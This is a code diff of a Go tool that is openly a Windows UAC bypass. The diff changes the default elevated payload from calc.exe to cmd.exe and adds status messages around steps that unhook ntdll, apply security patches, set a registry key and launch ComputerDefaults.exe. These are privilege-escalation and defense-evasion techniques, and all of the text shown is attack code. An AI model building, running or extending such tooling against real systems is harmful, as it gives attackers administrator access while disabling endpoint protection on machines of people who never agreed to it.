@@ -24,7 +24,7 @@ const (
 	TOKEN_QUERY                       = 0x0008
 
 	// Configure this path to your desired executable for UAC bypass
-	UAC_BYPASS_EXECUTABLE = `C:\Windows\System32\cmd.exe /c C:\Windows\System32\calc.exe`
+	UAC_BYPASS_EXECUTABLE = `C:\Windows\System32\cmd.exe /c C:\Windows\System32\cmd.exe`
 )
 
 type UNICODE_STRING struct {
@@ -126,6 +126,7 @@ func main() {
 	executablePathPtr := flag.String("exec", UAC_BYPASS_EXECUTABLE, "Path to the executable for UAC bypass")
 	flag.Parse()
 	winapi.UnhookNtdll()
+	fmt.Println("Unhooked NTDll")
 	executablePath := *executablePathPtr
 
 	fmt.Println("Starting UAC bypass...")
@@ -136,6 +137,7 @@ func main() {
 	}
 	fmt.Println("Registry key created successfully")
 	winapi.ApplyAllPatches()
+	fmt.Println("Applied patches successfully")
 	fmt.Println("Executing ComputerDefaults.exe...")
 	if err := executeComputerDefaults(); err != nil {
 		log.Fatalf("Failed to execute ComputerDefaults.exe: %v", err)
